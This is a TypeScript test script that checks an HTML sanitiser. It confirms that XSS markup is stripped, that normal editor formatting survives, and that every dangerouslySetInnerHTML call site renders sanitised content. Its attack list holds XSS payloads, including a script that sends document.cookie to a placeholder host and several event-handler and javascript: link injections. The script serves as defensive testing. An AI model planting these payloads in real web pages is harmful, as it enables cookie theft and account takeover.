/**
 * Verifies the sanitiser both blocks what it must and preserves what it must.
 *
 * The stored-XSS fix in the product description was possible only because
 * sanitizeRichText's allowlist is restrictive. This asserts the two halves
 * together, because a sanitiser that stripped everything would also "pass" a
 * block-only test while quietly destroying every product description in the
 * catalogue.
 *
 *   npx tsx scripts/verify-sanitize.mts
 */
import { readdirSync, readFileSync, statSync } from "node:fs";
import { join } from "node:path";
import { sanitizePlainText, sanitizeRichText, sanitizeToText } from "../lib/sanitize";

let failures = 0;
const check = (label: string, pass: boolean, detail = "") => {
  if (!pass) failures++;
  console.log(`${pass ? "pass" : "FAIL"}  ${label}${detail && !pass ? `  -> ${detail}` : ""}`);
};

// 1. Dangerous markup must not survive sanitisation.
const attacks: [string, string, string][] = [
  ["a script element", "<p>hi</p><script>fetch('//evil.tld/?c='+document.cookie)</script>", "script"],
  ["an img onerror handler", `<img src=x onerror="alert(1)">`, "onerror"],
  ["an img onload handler", "<img src=x onload=alert(1)>", "onload"],
  ["an inline svg onload", `<svg onload="alert(1)"></svg>`, "svg"],
  ["an iframe", `<iframe src="https://evil.tld"></iframe>`, "iframe"],
  ["an object tag", `<object data="evil.swf"></object>`, "object"],
  ["an embed tag", `<embed src="evil.swf">`, "embed"],
  ["a form", `<form action="//evil.tld"><input name=pw></form>`, "<form"],
  ["a javascript: link", `<a href="javascript:alert(1)">click</a>`, "javascript:"],
  ["a data: link", `<a href="data:text/html;base64,PHNjcmlwdD4=">click</a>`, "data:"],
  ["a body onload", `<body onload="alert(1)">text</body>`, "onload"],
  ["a style with a url() beacon", `<p style="background:url('//evil.tld/beacon')">x</p>`, "evil.tld"],
  ["an expression() style", `<p style="width:expression(alert(1))">x</p>`, "expression"],
  ["a details ontoggle handler", `<details open ontoggle="alert(1)">x</details>`, "ontoggle"],
  ["a base tag with a target", `<base href="//evil.tld">`, "<base"],
  ["a meta refresh", `<meta http-equiv="refresh" content="0;url=//evil.tld">`, "<meta"],
];

for (const [label, payload, forbidden] of attacks) {
  const out = sanitizeRichText(payload);
  const lowered = out.toLowerCase();
  check(
    `sanitizeRichText removes ${label}`,
    !lowered.includes(forbidden),
    out,
  );
}

// 2. Legitimate editor output must survive. A sanitiser that flattens formatting
//    is a data-loss bug of its own, and the product editor produces all of this.
const legitimate: [string, string][] = [
  ["bold and italic", "<p><strong>Bold</strong> and <em>italic</em></p>"],
  ["paragraphs and line breaks", "<p>First</p><p>Second</p>"],
  ["an https link", `<p><a href="https://example.com" target="_blank">Example</a></p>`],
  ["a mailto link", `<p><a href="mailto:info@example.com">Email us</a></p>`],
  ["unordered and ordered lists", "<ul><li>One</li></ul><ol><li>Two</li></ol>"],
  ["a table", "<table><thead><tr><th>Head</th></tr></thead><tbody><tr><td>Cell</td></tr></tbody></table>"],
  ["headings", "<h2>Section</h2><h3>Subsection</h3>"],
  ["blockquote and code", "<blockquote>Quoted</blockquote><pre><code>npm run build</code></pre>"],
  ["a site-relative link", `<p><a href="/products">Catalogue</a></p>`],
  ["allowed inline styling", `<p style="text-align: center">Centred</p>`],
];

for (const [label, payload] of legitimate) {
  const out = sanitizeRichText(payload);
  const lost = out.replace(/<[^>]+>/g, "").replace(/\s+/g, " ").trim();
  check(
    `sanitizeRichText keeps ${label}`,
    lost.length > 0,
    `everything was stripped: ${out}`,
  );
}

// 3. Links must keep their safe href, and an unsafe one must be dropped rather
//    than downgraded to something that still navigates.
check(
  "a safe href is preserved",
  sanitizeRichText(`<a href="https://example.com">x</a>`).includes("https://example.com"),
);
check(
  "a javascript: href is removed rather than kept as text",
  !sanitizeRichText(`<a href="javascript:alert(1)">x</a>`).toLowerCase().includes("javascript:"),
);

// 3b. Images are stripped, and that is deliberate. The rich text editor is
//     StarterKit only and @tiptap/extension-image is not a dependency, so it
//     cannot produce an <img>; product imagery belongs in the gallery table, not
//     in the description body. Asserted so nobody "fixes" this by allowing img
//     and unknowingly re-opening an injection vector.
check(
  "sanitizeRichText strips images, which the editor cannot create",
  !sanitizeRichText(`<img src="https://cdn.example.com/a.png" alt="A">`).includes("<img"),
  sanitizeRichText(`<img src="https://cdn.example.com/a.png" alt="A">`),
);
check(
  "the image editor extension really is not installed",
  !readFileSync("package.json", "utf8").includes("@tiptap/extension-image"),
);

// 4. The plain-text variants strip markup completely.
check("sanitizeToText removes all markup", !sanitizeToText("<b>bold</b> <script>x</script>").includes("<"));
check("sanitizePlainText removes all markup", !sanitizePlainText("<b>bold</b> <script>x</script>").includes("<"));
check("sanitizePlainText enforces its length cap", sanitizePlainText("x".repeat(5000), 100).length === 100, `${sanitizePlainText("x".repeat(5000), 100).length}`);
check("sanitizePlainText collapses whitespace", sanitizePlainText("a\n\n  b") === "a b", JSON.stringify(sanitizePlainText("a\n\n  b")));
check("sanitizeRichText handles null", sanitizeRichText(null) === "");
check("sanitizeRichText handles undefined", sanitizeRichText(undefined) === "");

// 5. Every dangerouslySetInnerHTML call site must render a sanitised value.
const SOURCE_ROOTS = ["app", "components"];
const SANITISERS = /sanitize(?:RichText|PlainText|ToText)|jsonLdScript/;
const files: string[] = [];
const walk = (dir: string) => {
  for (const entry of readdirSync(dir)) {
    const full = join(dir, entry);
    if (statSync(full).isDirectory()) walk(full);
    else if (/\.(tsx|ts)$/.test(entry)) files.push(full);
  }
};
for (const root of SOURCE_ROOTS) walk(root);

//    This is the check that would have caught the original bug recurring: the
//    product page rendered a stored column straight through this attribute with
//    no sanitiser, and nothing else in the project would have noticed.
//
//    Two shapes are accepted, because the codebase uses both and the second is
//    the better one:
//      a) inline  — dangerouslySetInnerHTML={{ __html: sanitizeRichText(x) }}
//      b) indirect — a local bound earlier, `const safe = sanitizeRichText(x)`,
//         then __html: safe. Checking only the 220 characters after the attribute
//         reports a false positive on every site of this shape, which is how news
//         and services are written.
let callSites = 0;
for (const file of files) {
  const source = readFileSync(file, "utf8");
  // Identifiers in this file that were assigned from a sanitiser call.
  const sanitisedLocals = new Set<string>();
  const assign = /(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*(?:await\s+)?sanitize(?:RichText|PlainText|ToText)\s*\(/g;
  for (let m = assign.exec(source); m; m = assign.exec(source)) sanitisedLocals.add(m[1]);

  let from = 0;
  for (;;) {
    const idx = source.indexOf("dangerouslySetInnerHTML={", from);
    if (idx === -1) break;
    callSites++;
    // The `__html:` expression is the first ~180 characters of the JSX
    // expression, before any child content that follows it.
    const expr = source.slice(idx, idx + 180);
    const html = expr.match(/__html:\s*([^}\n]+)/)?.[1]?.trim() ?? "";
    const inline = SANITISERS.test(html);
    // A bare identifier, possibly destructured, that was sanitised earlier.
    const local = /^([A-Za-z_$][\w$]*)$/.test(html) && sanitisedLocals.has(html);
    check(
      `${file}: dangerouslySetInnerHTML renders a sanitised value`,
      inline || local,
      `__html: ${html || "(not found)"}`,
    );
    from = idx + 1;
  }
}
console.log(`\nchecked ${files.length} source file(s), ${callSites} dangerouslySetInnerHTML call site(s)`);

console.log(failures === 0 ? "\nALL SANITISE CHECKS PASSED" : `\n${failures} SANITISE CHECK(S) FAILED`);
process.exit(failures === 0 ? 0 : 1);
